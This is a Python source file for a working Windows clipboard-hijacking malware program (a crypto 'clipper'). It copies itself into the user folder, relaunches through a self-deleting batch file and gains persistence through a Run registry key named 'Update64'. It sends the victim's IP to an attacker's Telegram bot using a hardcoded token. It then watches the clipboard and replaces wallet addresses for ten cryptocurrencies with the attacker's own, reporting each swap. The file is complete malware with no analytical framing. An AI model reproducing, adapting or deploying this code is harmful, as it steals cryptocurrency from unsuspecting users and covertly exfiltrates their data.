import pyperclip
import re
import winreg
import os
import shutil
import sys
import subprocess
import time
import requests
import socket
from getpass import getuser
from datetime import datetime
import threading


addresses = {
    'BTC': 'bc1qnrylqrxq3yzfnz89smp56lm5uu0ful8dsuzus9',
    'ETH': '0x2525bC1f865229C6B897353f64fFeF471B0B6e1b',
    'TRC20': 'TKdJXyopnrTafFvFuDJ2BA8j6yHRpWutuk',
    'LTC': 'LcArrhHNrSnBcYyYYVr5hgbaK66xBg7AST',
    'TON': 'UQC1nX2628sQdTRMsHtDEyM1Wdj5tYbT-NFUM94xYeFgfIg0',
    'DASH': 'Xuxkb1VHKD4UxH9cyhAK1yGPguA8prxBKu',
    'SOL': '7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh',
    'DOGE': 'DPyndDG6gNNjF7kA6Amm3uujqduiaM7Ehn',
    'XRP': 'rENTsdEC3sbfsfXyQzSFbRJnXhsTPsJ9W4',
    'BCH': 'qrx9fg2r0xac6e2rf4jp33j50nugwwuvqvlv9rn3mc'
}

BOT_TOKEN = '8468982756:AAFtRAXkPAN_D4tjrlPlWdYWXkRNtCX4gzc'
CHAT_ID = '7556622176'


# Автозапуск
get_file_name = os.path.basename(sys.executable)
if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + get_file_name and not os.path.exists(
        'C:\\Users\\' + getuser() + '\\' + get_file_name):
    shutil.copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + get_file_name)

    with open(f'C:\\Users\\{getuser()}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[-1]
        activator.write(
            f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{process_name}"\nstart "" "{get_file_name}"\ndel "%~f0"')
    subprocess.Popen(f'C:\\Users\\{getuser()}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW).wait()
    sys.exit(0)


def startup():
    get_file_name = os.path.basename(sys.executable)
    try:
        registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        key = winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, 'Update64', 0, winreg.REG_SZ, f'{os.getcwd()}\\{get_file_name}')
        winreg.CloseKey(key)
    except Exception as e:
        error_msg = f"❌ Error: {e}"
        print(error_msg)
        send_telegram_message(error_msg)


def get_ip_address():
    try:
        response = requests.get('https://api.ipify.org', timeout=10)
        return response.text
    except:
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            return f"Local: {local_ip}"
        except:
            return "Unknown"


def get_system_info():
    try:
        ip_address = get_ip_address()

        info = f"🌐 IP : {ip_address}\n"
        info += f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        return info
    except Exception as e:
        return f"Error getting system info: {e}"


def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Failed to send Telegram message: {e}")
        return None


def send_startup_info():
    system_info = get_system_info()

    startup_message = f"🚀 New launch!\n\n{system_info}"
    send_telegram_message(startup_message)

threading.Thread(target=send_startup_info, daemon=True).start()
startup()


def match():
    clipboard = str(pyperclip.paste())
    btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
    eth_match = re.match("^0x[a-fA-F0-9]{40}$", clipboard)
    trc20_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
    ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
    ton_match = re.match("^UQ[a-zA-Z0-9_-]{46}$", clipboard)
    dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
    sol_match = re.match("^(?:[a-zA-Z0-9]){44}$", clipboard)
    doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
    xrp_match = re.match("^r[0-9a-zA-Z]{24,34}$", clipboard)
    bch_match = re.match("^(bitcoincash:)?(q|p)[a-z0-9]{41}$", clipboard)

    for currency, address in addresses.items():
        if eval(f'{currency.lower()}_match'):
            if address and address != clipboard:

                log_message = f"🔁 New address change!\n\n" \
                              f"💰 : {currency}\n" \
                              f"📋 : {clipboard}\n" \
                              f"🔄 : {address}\n\n" \
                              f"🌐 : {get_ip_address()}\n" \
                              f"⏰ : {datetime.now().strftime('%H:%M:%S')} {datetime.now().strftime('%Y-%m-%d')}"

                send_telegram_message(log_message)

                pyperclip.copy(address)
            break


previous_clipboard = pyperclip.paste()

while True:
    try:
        current_clipboard = pyperclip.paste()
        if current_clipboard != previous_clipboard:
            previous_clipboard = current_clipboard
            match()
        time.sleep(0.01) 
    except Exception as e:
        error_msg = f"❌ Error: {e}"
        print(error_msg)
        send_telegram_message(error_msg)
        time.sleep(1)